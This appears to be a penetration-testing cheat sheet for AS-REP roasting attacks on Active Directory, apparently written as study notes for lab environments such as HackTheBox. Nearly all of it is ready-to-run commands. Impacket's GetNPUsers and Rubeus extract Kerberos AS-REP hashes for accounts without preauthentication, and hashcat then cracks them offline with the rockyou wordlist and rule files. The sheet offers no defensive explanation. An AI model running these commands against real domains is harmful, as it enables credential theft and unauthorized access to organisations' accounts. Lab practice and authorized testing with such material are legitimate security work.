## We got Users but no Pass?

### Links

- [GitHub Rubeus](https://github.com/GhostPack/Rubeus)
### ASREP Roasting Attack

```
impacket-GetNPUsers htb.local/ -usersfile user.txt -format hashcat -outputfile hashes.domain.txt

.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
```

```

impacket-GetNPUsers -dc-ip 192.168.205.70  -request -outputfile hashes.asreproast corp.com/pete
hashcat --help | grep -i "Kerberos"

sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

cd C:\Tools
.\Rubeus.exe asreproast /nowrap

sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```




